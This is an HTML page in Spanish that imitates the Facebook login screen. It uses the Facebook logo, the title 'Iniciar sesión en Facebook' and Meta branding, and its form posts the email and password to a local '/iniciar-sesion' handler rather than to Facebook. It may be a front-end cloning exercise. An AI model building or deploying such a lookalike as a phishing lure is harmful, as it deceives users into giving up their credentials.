
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en Facebook</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="left-side">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" alt="Facebook Logo">
            </div>
            <div class="tagline">
                <h1>Explora lo que <span>más te gusta.</span></h1>
            </div>
        </div>
        <div class="right-side">
            <div class="login-form">
                <h2>Iniciar sesión en Facebook</h2>
                <form action="/iniciar-sesion" method="post">
                    <input type="text" name="email" placeholder="Correo electrónico o número de celular" required>
                    <input type="password" name="password" placeholder="Contraseña" required>
                    <button type="submit">Iniciar sesión</button>
                </form>
                <a href="#">¿Olvidaste tu contraseña?</a>
                <hr>
                <button class="create-account">Crear cuenta nueva</button>
                <div class="meta-logo">
                    <p><span>Meta</span></p>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
